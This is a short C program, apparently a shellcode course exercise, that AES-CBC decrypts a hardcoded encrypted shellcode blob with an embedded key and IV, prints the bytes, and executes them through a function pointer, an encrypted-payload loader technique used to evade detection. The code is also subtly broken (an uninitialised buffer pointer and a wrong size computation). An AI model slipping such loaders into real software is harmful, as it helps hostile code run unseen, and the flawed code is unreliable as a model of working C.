
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1

#include "aes.h"

int main() {


struct AES_ctx ctx;

uint8_t key[] = "32slaexplotation";
uint8_t iv[]  = "THis_is_a_testiv";
uint8_t str[] = "\xad\xb6\x3b\x0d\x86\x67\x76\xaa\x4b\xb5\xb5\x5a\x8e\x48\x6b\x0d\x8d\x02\xbd\x6f\xc4\x44\xaa\xd7\xe1\xf3\x1a\x3b\xed\x3a\x39\xb8";
unsigned char* shlcode;

int (*ret)() = (int(*)())shlcode;

printf("\n SLAE decrypted shellcode\n");

AES_init_ctx_iv(&ctx, key, iv);
AES_CBC_decrypt_buffer(&ctx, str, 32);


for (int i = 0; i < sizeof(str); ++i) {
    printf("\\x%02x", str[i]);
	shlcode[i] = str[i];

}

printf("\n");
        printf("Size: %d bytes.\n", sizeof(shlcode)); 
        ret();
}
